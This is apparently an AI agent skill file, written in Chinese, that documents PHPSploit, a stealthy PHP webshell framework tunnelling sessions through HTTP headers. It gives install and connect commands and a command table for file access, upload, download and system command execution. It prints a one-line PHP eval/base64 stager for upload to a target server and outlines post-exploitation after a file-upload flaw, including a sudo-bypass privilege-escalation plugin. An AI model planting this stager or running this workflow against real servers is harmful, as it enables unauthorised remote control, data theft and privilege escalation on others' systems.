---
name: "phpsploit"
description: ">"
---

# Phpsploit

*Sourced from killvxk-malskills-zh*

# PHPSploit

隐蔽 PHP webshell 框架 —— 通过 HTTP 头隧道化的完整交互式会话。

## 快速开始

```bash
pip install phpsploit
phpsploit

# 设置目标并连接
set TARGET http://target.com/shell.php
set PASSKEY MySecret
exploit
```

## 核心命令

| 命令 | 用途 |
|------|------|
| `set TARGET <url>` | 设置 webshell URL |
| `set PASSKEY <key>` | 设置混淆密钥 |
| `exploit` | 连接到 shell |
| `ls`、`cd`、`cat` | 文件系统操作 |
| `upload <local> <remote>` | 上传文件 |
| `download <remote>` | 下载文件 |
| `run <cmd>` | 执行系统命令 |
| `load <plugin>` | 加载插件 |

## Webshell 配置

最小化 PHP stager（上传到目标服务器）：
```php
<?php @eval(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
```

## 常用工作流程

**利用文件上传漏洞后进行后渗透：**
```
set TARGET http://target.com/uploads/shell.php
exploit
run whoami
```

**通过插件提权：**
```
load post/exploit/sudo-bypass
run
```

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/` | webshell 变体与插件列表 |

